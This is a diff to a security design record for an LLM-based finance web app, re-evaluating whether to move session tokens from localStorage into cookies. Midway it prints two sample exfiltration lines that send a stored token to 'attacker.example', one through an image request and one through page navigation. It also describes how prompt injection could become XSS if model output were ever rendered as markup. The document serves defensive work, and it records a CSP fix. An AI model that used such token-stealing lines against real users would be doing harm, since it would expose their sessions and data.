@@ -379,7 +379,88 @@ permissions policy denying camera, microphone, geolocation and payment.
 the configuration it is meant to describe.
 
 The original decision stands: this is a mitigation, not the fix. Cookie-based
-sessions remain the answer if the reversal condition ever triggers.
+sessions remain the answer if a reversal condition triggers.
+
+#### Re-evaluated 2026-07-30: is the cookie rework actually needed?
+
+Asked deliberately, and answered against this codebase rather than from general
+principle. **Conclusion: no, not now** — and the evaluation surfaced a hole in
+the CSP above that mattered more than the rework would have.
+
+**The exploit chain requires XSS.** Without script execution on our origin,
+`localStorage` is unreachable. So the question is only ever P(XSS) × blast
+radius.
+
+**P(XSS) here is unusually low, and this is countable rather than a feeling:**
+
+| Check | Result |
+|---|---|
+| Runtime dependencies | **4** — `react`, `react-dom`, `next`, `@supabase/supabase-js` |
+| Third-party scripts | **0** |
+| `dangerouslySetInnerHTML` / `innerHTML` / `eval` / `new Function` | **0** |
+| Markdown or HTML renderer | **none** — no such dependency exists |
+| Dynamic `href` | one, `citations[].source_url` |
+
+The last two rows carry most of the weight, because the obvious attack on an
+LLM product is *prompt injection → model emits markup → app renders it*. That
+path does not exist here. Model output reaches the DOM only through React text
+nodes (`{body.decision}`, `{step}`), which escape. And `source_url` cannot be
+invented by the model: `validate_recommendation` rejects any citation whose
+`(source_url, last_changed)` pair is not in the retrieved set, so the value
+originates in corpus metadata we seed. **The LLM is not a path to the DOM.**
+
+**Blast radius is bounded.** There is no payment method on file, no transfer
+execution, no ability to move value of any kind. A stolen session reads a card
+list, balances and question history, and can delete the account. That is a
+serious disclosure and a destructive act; it is not theft, and the distinction
+is real when weighing a rework against it.
+
+**What the cookie fix actually buys is smaller than it sounds.** `httpOnly`
+stops JavaScript *reading* the token. It does not stop an XSS making
+authenticated requests as the user — the cookie is attached automatically, so
+the attacker proxies through the victim's browser and reads everything anyway.
+What genuinely changes is that they cannot walk away with a long-lived refresh
+token for reuse later. That converts *persistent* compromise into
+*session-duration* compromise. Real, and worth having eventually — but it is not
+"XSS becomes harmless", and treating it that way is how this gets over-bought.
+It also adds CSRF surface that a `Bearer` header does not have.
+
+**The evaluation found a real defect in the CSP, now fixed.** The first draft
+carried `img-src 'self' data: https:` — waved through to avoid breaking avatars
+this app does not display. `img-src https:` is a complete exfiltration channel:
+
+```js
+new Image().src = "https://attacker.example/?t=" + localStorage.token
+```
+
+It never touches `connect-src`. The restrictive directive was being bypassed by
+a permissive one three lines above it, which is worse than no CSP because it
+reads as protection. Now `img-src 'self' data:`.
+
+**Also recorded, so it is not re-derived under pressure:** no CSP can stop
+`location = "https://attacker.example/?t=" + token`. Top-level navigation was
+meant to be covered by `navigate-to`, which no browser shipped. CSP closes the
+silent exfiltration channels, not the loud one.
+
+**Revised conditions that would make the rework necessary.** The original — a
+third-party script — still stands, and three more are now named, because the
+first is not the likeliest:
+
+1. **Any markdown or HTML renderer for model output.** The single most probable
+   future change here, since prettier answers are an obvious product wish. It
+   would convert prompt injection into XSS in one commit. If this is wanted,
+   the renderer must strip HTML, and that decision belongs in the same PR.
+2. **A crawler ingesting third-party pages into citation metadata.** Today
+   `source_url` is operator-seeded. When it is crawler-populated it is
+   attacker-influenced, and it is already rendered into an `href`.
+3. **The product gaining any ability to move value** — executing a transfer
+   rather than describing one. That changes the blast radius from disclosure to
+   theft, and the whole calculation with it.
+4. The first third-party script (unchanged).
+
+Until one of those, the CSP plus a 4-dependency, sink-free frontend is the
+better use of the effort, and the rework is deferred on evidence rather than on
+reluctance.
 
 ### P8 — FIXED 2026-07-30: `x-request-id` was client-controllable
 
